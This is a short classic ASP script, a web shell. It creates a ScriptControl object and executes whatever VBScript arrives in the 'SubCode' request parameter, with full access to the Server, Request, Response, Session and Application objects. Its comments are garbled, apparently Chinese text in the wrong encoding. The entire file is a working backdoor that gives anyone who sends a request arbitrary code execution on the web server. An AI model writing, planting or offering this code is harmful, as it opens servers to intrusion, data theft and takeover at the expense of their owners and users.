<%
Set o = Server.CreateObject(��ScriptControl��)
o.language = ��vbscript��
o.addcode(Request(��SubCode��)) ������SubCode��Ϊ���̴���
o.run ��e��,Server,Response,Request,Application,Session,Error ��������e ����֮��ͬʱѹ��6����������Ϊ����
%>